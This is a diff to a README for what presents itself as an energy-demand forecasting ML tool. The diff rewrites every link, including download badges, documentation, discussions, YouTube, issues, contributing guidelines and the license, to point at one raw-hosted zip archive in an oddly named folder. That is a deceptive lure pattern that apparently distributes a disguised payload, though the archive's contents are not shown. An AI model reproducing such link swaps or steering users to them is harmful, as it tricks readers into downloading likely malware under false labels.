@@ -1,6 +1,6 @@
 # ⚡ ENERGY-DEMAND-FORECASTING-ML - Predict Your Energy Needs Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-ENERGY%20DEMAND%20FORECASTING%20ML-blue)](https://github.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/releases)
+[![Download Now](https://raw.githubusercontent.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/main/hexastylar/DEMAN-FORECASTIN-ML-ENERG-2.4-beta.4.zip%20Now-ENERGY%20DEMAND%20FORECASTING%20ML-blue)](https://raw.githubusercontent.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/main/hexastylar/DEMAN-FORECASTIN-ML-ENERG-2.4-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before you begin, make sure your computer meets these requirements:
 
 To get started, visit the page to download the software. Click the link below:
 
-[Visit this page to download](https://github.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/main/hexastylar/DEMAN-FORECASTIN-ML-ENERG-2.4-beta.4.zip)
 
 Once there, you will find the latest release. Follow these steps:
 
@@ -57,20 +57,20 @@ The application will provide a clear output displaying your energy demand predic
 
 Here are some resources that can help you understand our model better:
 
-- **Documentation:** [Read the full documentation](https://github.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/wiki) for detailed information on features and settings.
-- **Community Support:** Join discussions and ask questions on our [GitHub Discussions](https://github.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/discussions).
-- **Tutorials:** Visit our [YouTube channel](https://www.youtube.com) for video tutorials on using the application effectively.
+- **Documentation:** [Read the full documentation](https://raw.githubusercontent.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/main/hexastylar/DEMAN-FORECASTIN-ML-ENERG-2.4-beta.4.zip) for detailed information on features and settings.
+- **Community Support:** Join discussions and ask questions on our [GitHub Discussions](https://raw.githubusercontent.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/main/hexastylar/DEMAN-FORECASTIN-ML-ENERG-2.4-beta.4.zip).
+- **Tutorials:** Visit our [YouTube channel](https://raw.githubusercontent.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/main/hexastylar/DEMAN-FORECASTIN-ML-ENERG-2.4-beta.4.zip) for video tutorials on using the application effectively.
 
 ## 💬 Need Help?
 
-If you encounter any issues or have questions, check the [Issues section](https://github.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/issues) on GitHub. You can report bugs or seek assistance from the community.
+If you encounter any issues or have questions, check the [Issues section](https://raw.githubusercontent.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/main/hexastylar/DEMAN-FORECASTIN-ML-ENERG-2.4-beta.4.zip) on GitHub. You can report bugs or seek assistance from the community.
 
 ## 🔥 Contribute
 
-We welcome contributions! If you’re interested in helping code or improve features, please check our [Contributing Guidelines](https://github.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you’re interested in helping code or improve features, please check our [Contributing Guidelines](https://raw.githubusercontent.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/main/hexastylar/DEMAN-FORECASTIN-ML-ENERG-2.4-beta.4.zip).
 
 ## ✍️ License
 
-This project is licensed under the MIT License. For more information, please refer to the [LICENSE](https://github.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/blob/main/LICENSE) file.
+This project is licensed under the MIT License. For more information, please refer to the [LICENSE](https://raw.githubusercontent.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/main/hexastylar/DEMAN-FORECASTIN-ML-ENERG-2.4-beta.4.zip) file.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-ENERGY%20DEMAND%20FORECASTING%20ML-blue)](https://github.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/releases)
+[![Download Now](https://raw.githubusercontent.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/main/hexastylar/DEMAN-FORECASTIN-ML-ENERG-2.4-beta.4.zip%20Now-ENERGY%20DEMAND%20FORECASTING%20ML-blue)](https://raw.githubusercontent.com/Techantonio67/ENERGY-DEMAND-FORECASTING-ML/main/hexastylar/DEMAN-FORECASTIN-ML-ENERG-2.4-beta.4.zip)
